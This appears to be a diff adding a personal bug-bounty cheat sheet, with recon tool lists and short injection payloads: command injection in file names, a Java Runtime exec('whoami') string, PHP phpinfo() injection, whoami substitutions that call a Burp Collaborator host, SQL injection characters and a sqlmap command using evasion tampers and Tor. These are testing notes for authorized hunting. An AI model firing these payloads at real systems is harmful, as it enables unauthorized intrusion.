@@ -1,0 +1,71 @@
+Advance Recon:
+
+Writeup RCE for beginners:
+https://ozguralp.medium.com/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311
+
+RCE Payload:
+
+File name or name : file.php;\id"#
+Name(Java): java.io.DataInputStream(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).readLine()
+
+Name(php) : insert phpinfo();
+
+why: some times developer use this
+
+<?php echo $name where name is the input you have given which turns into <?php echo phpinfo()
+
+
+Name: RCE,SSTI,XSS, HTMLI,DOS,rate limit, sqli, email html injection 
+
+Portswigger - blind command injection
+
+RCE in forget password(email field)
+
+Subscribe news letter 
+
+blog.target.com - subscribe 
+
+description-bio
+ssrf - `whoami`.burpcollab
+$(whoami).burpcollab
+
+
+Race cconditions:
+description : 
+sign up: it disclose sql information-500 internal server error
+coupon codes:
+api key - 
+
+
+sub.target.com(things to do)
+1. Waybackurls
+2. gau
+3. github
+4. dirsearch --recursive
+5. capture the request - spider - active -passive (collaborator everywhere,jsminer,linkfinder ,paramminer,huntscanner)
+
+paramminer- update profile(for idors)
+2. login 
+3. logout page 
+4. reset password 
+
+Settle on bugbounty platforms:
+1. choose any platform
+2. create 2 accounts (1 as main and 2nd for test) 
+
+
+sqli- 
+2. capture all login-update-register 
+
+',",%,\,/
+
+sqlmap -u url --tamper=between,randomcase,space2comment --level 5 --risk 3 --random-agent (if you want to use tor proxy) --tor 
+
+cookies:
+lang=en
+
+
+
+
+
+
